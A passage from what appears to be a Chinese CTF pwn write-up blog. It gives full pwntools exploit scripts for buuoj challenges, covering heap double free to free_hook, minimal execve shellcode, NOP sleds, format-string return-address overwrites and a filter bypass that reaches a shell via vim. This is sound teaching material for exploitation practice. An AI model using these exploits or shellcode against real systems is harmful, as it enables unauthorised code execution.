class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0003a940</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># vtable_addr=0xdeadbeef</span></span><br><span class="line"><span class="comment"># io_file_addr=0x804b284</span></span><br><span class="line"><span class="comment"># io_file=b&quot;/bin/sh;&quot;#_flags</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*11</span></span><br><span class="line"><span class="comment"># io_file+=p32(libc_base+0x1d8ce0)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x3)#fileno</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x0)*3</span></span><br><span class="line"><span class="comment"># io_file+=p32(heap_base+0x1208)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xffffffff)</span></span><br><span class="line"><span class="comment"># io_file+=p32(0xdeadbeef)*17</span></span><br><span class="line"><span class="comment"># io_file+=p32(0x804b2d8)</span></span><br><span class="line"><span class="comment"># io_file+=p32(sys_addr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=p32(0xdeadbeef)*0x8</span></span><br><span class="line"><span class="comment"># payload+=p32(io_file_addr)</span></span><br><span class="line"><span class="comment"># payload+=io_file</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)*<span class="number">0x8</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">b&quot;;sh&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(sys_addr)*<span class="number">3</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302082210135.png" alt="image-20230208221024944"></p>
<p>参考文章：<a href="https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/">https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/</a></p>
<h2 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h2><p>很简单，uaf漏洞，2.27的libc，直接打double free即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27530&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1693</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021735950.png" alt="image-20230702173556806"></p>
<h2 id="rctf-2019-shellcoder"><a href="#rctf-2019-shellcoder" class="headerlink" title="rctf_2019_shellcoder"></a>rctf_2019_shellcoder</h2><p>考察了 <code>shellcode</code> 的编写，只有七个字节输入的机会，然后将其执行。</p>
<p>我采用的是用 <code>xchg</code> 指令来交换了 <code>rdi</code> 和 <code>rsi</code> 的值，以此来节省了字节数，再次执行系统调用<code>read</code>（同时还采用了 <code>mov edx,esi</code> 指令又节省了一个字节，才凑齐了七个字节）</p>
<p>这次的 <code>read</code> 可以读入很多字节了，正常打 <code>execve(&quot;/bin/sh\x00&quot;)</code> 的 <code>shellcode</code> 即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27174</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x47c</span>,<span class="number">0x4c7</span>)</span><br><span class="line">payload=<span class="string">&quot;\x48\x87\xF7\x89\xF2\x0F\x05&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;hello shellcoder:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov r11,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push r11</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh\x00&quot;,0,0)</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+asm(shellcode)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031458424.png" alt="image-20230703145813242"></p>
<h2 id="picoctf-2018-gps"><a href="#picoctf-2018-gps" class="headerlink" title="picoctf_2018_gps"></a>picoctf_2018_gps</h2><p>本题是泄露了一个栈地址，然后有一个任意地址执行的机会，因为没开 <code>MX</code> 保护，所以可以直接跳转到 <code>shellcode</code> 上，又因为泄露的地址和执行的位置存在随机化（所以采用 <code>nop</code> 滑行的方式执行到 <code>shellcode</code> 上）</p>
<p>因为存在随机化的过程，导致了不一定能落在 <code>nop</code> 上，<code>exp</code> 有概率打不通</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>,<span class="string">&quot;node4.buuoj.cn:25715&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x400aaa</span>,<span class="number">0x400a76</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Current position: &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">hex</span>(<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(stack_addr[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x400</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&#x27;s your plan?\n&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Where do we start?\n&gt; &quot;</span>,<span class="built_in">str</span>(stack_addr[<span class="number">2</span>:]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031602132.png" alt="image-20230703160237889"></p>
<h2 id="tiny-backdoor-v1-hackover-2016"><a href="#tiny-backdoor-v1-hackover-2016" class="headerlink" title="tiny_backdoor_v1_hackover_2016"></a>tiny_backdoor_v1_hackover_2016</h2><p>本题考察的和 <code>rctf_2019_shellcoder</code>  一样，这题是能输入九个字节的 <code>shellcode</code> ，但是加了一个异或加密的过程，只需要反向将其异或解密即可（就是把 <code>shellcode</code> 与要异或的固定值异或一次得到的结果进行发送即可）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27311</span>)</span><br><span class="line">debug(p,<span class="number">0x400132</span>)</span><br><span class="line"></span><br><span class="line">shellcode=[<span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xD7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>,<span class="number">0x90</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="number">0xB3</span>, <span class="number">0x91</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>, <span class="number">0x62</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x6A</span>, <span class="number">0x90</span>]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode[cnt]^i))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\xfb\x16\xa8\x95\x53\x41\x1e\x6f\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307031634544.png" alt="image-20230703163428321"></p>
<h2 id="hitcon-2018-hackergame-2018-calc"><a href="#hitcon-2018-hackergame-2018-calc" class="headerlink" title="hitcon_2018_hackergame_2018_calc"></a>hitcon_2018_hackergame_2018_calc</h2><p>这道题很有意思，和保护机制没关系。主函数实现了一个计算器的功能，可以用来进行加减乘除运算，最初我是没找到这个函数有漏洞的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032147008.png" alt="image-20240303214740851"></p>
<p>而后发现了 <code>err</code> 函数，其中有机会执行我们输入的命令，对其进行交叉引用，发现在 <code>init</code> 函数中被调用。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032148174.png" alt="image-20240303214841070"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032150572.png" alt="image-20240303215039472"></p>
<p>发现在程序抛出 <code>4</code> <code>6</code> <code>8</code> <code>11</code> 信号的时候，都会调用 <code>err</code> 函数。</p>
<p><code>4</code> 表示在执行不合法指令或者非特权模式下执行特权指令时会发出信号 <code>SIGILL</code></p>
<p><code>6</code> 表示进程异常终止，通常由标准库中的 <code>abort</code> 函数引起，用于异常终止程序的执行，发出信号 <code>SIGABRT</code></p>
<p><code>8</code> 表示发生了浮点运算错误，如除以零或者运算导致产生溢出，抛出信号 <code>SIGFPE</code></p>
<p><code>11</code> 是常见的段错误 <code>SIGSEGV</code> ，表示进程尝试访问一块非法内存（不存在地址，或者向只读地址中写入数据等等）</p>
<p><code>main</code> 函数中很明显能发现在实现加减乘除的运算，那么肯定是要想办法让程序抛出 <code>SIGFPE</code> 信号</p>
<p>由于做了检查，没办法控制除法运算时的除数为 <code>0</code> 。也就是想通过一个数字除 <code>0</code> 是不可能的因为发现做运算时的 <code>v4</code> 被强转为了 <code>int</code> ，但是做检查时的 <code>v4</code> 是无符号数。尝试从这里用两种类型的切换做一个绕过，<code>-4294967296</code> 会被解析成 <code>0</code>（将高位舍弃后剩下的低位都是 <code>0</code>，但是这在写入内存时依然是 <code>0</code> 绕过不过检查） </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032205355.png" alt="image-20240303220517233" style="zoom: 67%;" />



<p>在这篇 <a href="https://zh.wikipedia.org/wiki/SIGFPE">文章</a> 中提到了下面的描述</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032221469.png" alt="image-20240303222138301"></p>
<p>这意味着在做除法运算时，产生的商溢出也会触发 <code>SIGFPE</code> 信号。</p>
<p>以 <code>int</code> 类型为例，它的范围是 <code>-2^31 ~ 2^31-1</code> 为什么正数部分要减 <code>1</code> ？</p>
<p>因为在有符号整数表示中，需要保留一个表示 <code>0</code> 的值，所以最大正数值需要减去 <code>1</code></p>
<p>这也就是上面图片中的红框部分所展示的，如果拿负数的最小值去除以 <code>-1</code> ，数字应该是变成负数的绝对值，但因为这个数字无法表示（其实是太大导致进位溢出了）。导致了 <code>SIGFPE</code> 的产生，因此只需要输入 <code>-2147483648/-1</code> 就能触发 <code>err</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403032230691.png" alt="image-20240303223034582"></p>
<p>但是在 <code>err</code> 函数中用 <code>strstr</code> 函数过滤了 <code>sh</code> 字符串。在这种情况下如何命令执行？</p>
<p>第一反应要拿到 <code>flag</code> 应该是直接 <code>cat flag</code> ，效果如下，没有将 <code>flag</code> 文件的内容输出，而是输出了 <code>flag</code> 这个字符串。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403040955658.png" alt="image-20240304095533455"></p>
<p>原因是因为 <code>scanf %s</code> 读入字符串时，遇见空格和回车都会结束字符串的读取。导致 <code>execlp</code> 函数执行时的命令只有 <code>cat</code> ，而 <code>flag</code> 字符串被存在了缓冲区中，当 <code>cat</code> 命令执行后，读取到了缓冲区存放的 <code>flag</code> 字符串，也就是像下面这个样子。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403040959942.png" alt="image-20240304095938845"></p>
<p>同时还考虑了能不能用 <code>s&#39;&#39;h</code> 来绕过 <code>strstr</code> 所做的过滤，在 <code>shell</code> 中这样确实可以执行出 <code>sh</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403041002244.png" alt="image-20240304100219138"></p>
<p>但这种单引号的解析实际是 <code>shell</code> 解释器做的，而程序中的 <code>execlp</code> 库函数内部调用了系统调用 <code>execve</code> ，没办法去解析单引号，所以 <code>s&#39;&#39;h</code> 是执行失败的。</p>
<p>看 <code>roderick</code> 师傅的 <a href="https://www.cnblogs.com/LynneHuan/p/16097702.html">wp</a> 发现是先调用了 <code>vim</code> ，输入 <code>:!sh</code> 执行了 <code>sh</code> 命令。原理是因为 <code>:</code> 从编辑模式切换到末行模式后 <code>!</code> 表示 <code>vim</code> 执行后面跟着的命令，并将命令的输出结果显示在 <code>vim</code> 的界面中。因为在执行 <code>:!sh</code> 时已经在 <code>vim</code> 中了，不会受到任何过滤的影响从而调用了 <code>sh</code>。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403041031107.png" alt="image-20240304103156991" style="zoom: 67%;" />





<h2 id="第十七章-17-2-5-漏洞利用-final-fmt"><a href="#第十七章-17-2-5-漏洞利用-final-fmt" class="headerlink" title="[第十七章][17.2.5 漏洞利用]final_fmt"></a>[第十七章][17.2.5 漏洞利用]final_fmt</h2><p>因为太久没做格式化字符串的题目了，突然看这个题导致思路卡了一下，远程没通。先说下正确的思路，程序有一次向 <code>bss</code> 段输入数据的机会，并且泄露了一个栈地址，然后存在一次格式化字符串漏洞。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092123708.png" alt="image-20240309212308484"></p>
<p>因为有栈地址，所以考虑去劫持 <code>main</code> 函数或者 <code>printf</code> 函数的返回地址。让执行流重新回到 <code>start</code> 函数或者 <code>main</code> 函数。并且在第一次劫持时顺带泄露 <code>libc</code> 地址。太久没做，我以为是用 <code>%p</code> 泄露的地址是多少，就相当于后面写入的内存值要加上多少。这样一来泄露 <code>libc</code> 地址就会导致后面再劫持返回地址失败。但事实上后续写入值只需要加上打印地址的字节数而已，比如四字节的 <code>libc</code> 地址，那么后面写入内存减去 <code>4</code> 即可（这里还是学弟告诉我的，也怪当时没有自己去验证，<del>才不是因为太久没做这类题目</del>🥲 ）</p>
<p>思路很简单，拿到 <code>libc</code> 地址后劫持 <code>main</code> 函数的返回地址为 <code>one_gadget</code>，<code>exp</code> 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p,e,libc=load(&quot;final_fmt&quot;,&quot;node5.buuoj.cn:27466&quot;,&quot;www1.so&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29166</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;final_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./www1.so&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x8048635</span>)</span><br><span class="line">main=<span class="number">0x804856E</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your name:\n&quot;</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;meet~&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x8c</span>+<span class="number">0x10</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">system1=<span class="number">0x804</span>-<span class="number">0x18</span></span><br><span class="line">system2=<span class="number">0x856e</span>-system1-<span class="number">0x18</span></span><br><span class="line">payload=p32(e.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&quot;%4$s&quot;</span></span><br><span class="line">payload+=p32(stack+<span class="number">2</span>)+p32(stack)+<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(system1).encode()+<span class="string">b&quot;c%6$hn&quot;</span>+<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(system2).encode()+<span class="string">b&quot;c%7$hn&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;do you have something say to me~\n&quot;</span>,payload)</span><br><span class="line">read_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc_addr=read_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">one5=libc_addr+<span class="number">0x5f075</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your name:\n&quot;</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">system3=(one5&amp;<span class="number">0xffff</span>)</span><br><span class="line">log_addr(<span class="string">&quot;system3&quot;</span>)</span><br><span class="line">system4=((one5&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-system3</span><br><span class="line">log_addr(<span class="string">&quot;system4&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack=stack+<span class="number">0x10</span>-<span class="number">0xc</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">payload=p32(e.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&quot;%4$s&quot;</span></span><br><span class="line">payload+=p32(stack)+p32(stack+<span class="number">2</span>)+<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(system3-<span class="number">0x18</span>).encode()+<span class="string">b&quot;c%6$hn&quot;</span>+<span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(system4).encode()+<span class="string">b&quot;c%7$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;do you have something say to me~\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092137069.png" alt="image-20240309213711913"></p>
<p>这里再记录一下在我忘记可以一边泄露，一边写入的操作时是如何做的这道题目。我首先观察到可以向 <code>bss</code> 段写入数据。那么可以在 <code>bss</code> 段上布置 <code>rop</code> 去泄露 <code>libc</code>。只需要用格式化字符串漏洞做一个栈迁移即可。</p>
<p>但经过测试后发现一个问题，<code>bss</code> 段距离 <code>text</code> 段太近，如果直接执行 <code>printf</code> 或者 <code>puts</code> 函数，那么开辟栈帧时就会到 <code>text</code> 段，因为该地址区域不可写，就会造成崩溃。</p>
<p>我采取的思路是用 <code>rop</code> 链调用 <code>read</code> 函数，向 <code>bss</code> 段写入大量的 <code>ret</code> （并且同时覆盖 <code>read</code> 原本的返回地址为 <code>ret</code>），滑到地址较高的区域，再执行 <code>puts</code> 函数泄露 <code>libc</code> 地址，随后 <code>rop</code> 来拿 <code>shell</code>。这个 <code>exp</code> 本地打通没问题，但不知道为什么打远程 <code>libc</code> 地址都泄露不出来（因为泄露 <code>libc</code> 地址这步是 <code>rop</code> 做的，感觉和本地远程关系不大，探究了一段时间，未果，于是放弃）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&quot;./final_fmt&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;node5.buuoj.cn&quot;,29023)</span></span><br><span class="line">e=ELF(<span class="string">&quot;final_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/zikh/Desktop/libc6-i386_2.23-0ubuntu11.3_amd64.so&quot;</span>)</span><br><span class="line">start_addr=<span class="number">0x08048400</span></span><br><span class="line">ret_addr=<span class="number">0x08048660</span></span><br><span class="line">wtf_addr=<span class="number">0x0804A260</span></span><br><span class="line">payload=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(start_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a064</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment"># payload=p32(e.plt[&#x27;puts&#x27;])+p32(start_addr)+p32(e.got[&#x27;puts&#x27;])</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;first meet~&quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0804A060</span></span><br><span class="line">target_addr=stack_addr+<span class="number">0x84</span></span><br><span class="line">log_addr(<span class="string">&#x27;target_addr&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048635</span>,<span class="number">0x8048390</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%2052c%12$hn&#x27;</span>+<span class="string">b&#x27;%39008c%11$hnaaa&#x27;</span></span><br><span class="line">payload+=p32(target_addr)+p32(target_addr+<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;do you have something say to me~&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">pop_addr=<span class="number">0x80486CB</span></span><br><span class="line">pop3_addr=<span class="number">0x80486C9</span></span><br><span class="line">pause()</span><br><span class="line">payload=p32(ret_addr)*<span class="number">0x100</span>+p32(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(pop_addr)+p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(pop3_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a474</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="pwnable-loveletter"><a href="#pwnable-loveletter" class="headerlink" title="pwnable_loveletter"></a>pwnable_loveletter</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240311222827587.png" alt="image-20240311222827587"></p>
<p>该题有一次输入数据的机会，数据长度为 <code>0x100</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240311223050286.png" alt="image-20240311223050286"></p>
<p>然后经过 <code>protect</code> 函数的过滤，如果存在了这些字符，那么会将这些字符替换成一个爱心字符（用三字节表示）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240311223032310.png" alt="image-20240311223032310"></p>
<p>将过滤后的内容复制到 <code>bss</code> 段，不过复制的该数据的前后都有字符串常量的干扰。最后将整个字符串执行</p>
<p>因为对于命令分隔符的过滤很全，所以用命令分隔符来分割命令是不现实的。本题考察的核心点（个人认为）是如何在不用命令分隔符的情况下，执行字符串中的有效命令。</p>
<p>一个漏洞点是通过使用被过滤的字符，换成三字节的爱心，从而实现栈溢出。但因为 <code>canary</code> 的限制无法进行 <code>rop</code> </p>
<p>查看网上的 <code>wp</code> 做法，通过溢出来控制 <code>memcpy</code> 函数的  <code>size</code> （这里我是发现了，但不知道怎么用）进行一些后续利用。</p>
<p>可以控制 <code>v6</code> 为 <code>0</code> 让字符串 <code>echo I love </code> 都不进行拷贝，这样我们输入的字符串就是起始命令，而分割命令后面的垃圾数据的方法有很多，网上看的有用 <code>sh -c sh </code> 命令的（分割前面也可以控制 <code>size</code> 为 <code>1</code> ，从而命令为 <code>env sh -c sh</code>）去分割后面的垃圾字符。但其实也可以直接用 <code>cat flag</code> 命令丢弃后面的垃圾字符</p>
<p><strong>更新：经过学弟 <a href="https://www.cnblogs.com/Sta8r9">sta8r9</a> 的提示，其实前面的理解是错的。因为把下面的 <code>exp</code> 中 <code>\x00</code> 去掉也依然可以拿到 <code>flag</code> 。究其原因是 <code>protect</code> 函数中是将一个非法字符替换成了四个字节表示爱心（其中一个是空字节），而最后溢出覆盖 <code>size</code> 也就是 <code>v6</code> 的值是被爱心里的 <code>\x00</code> 给覆盖了，我们后面输入的 <code>\x00</code> 则在 <code>protect</code> 函数中就已经被截断了，不会被拷贝。</strong></p>
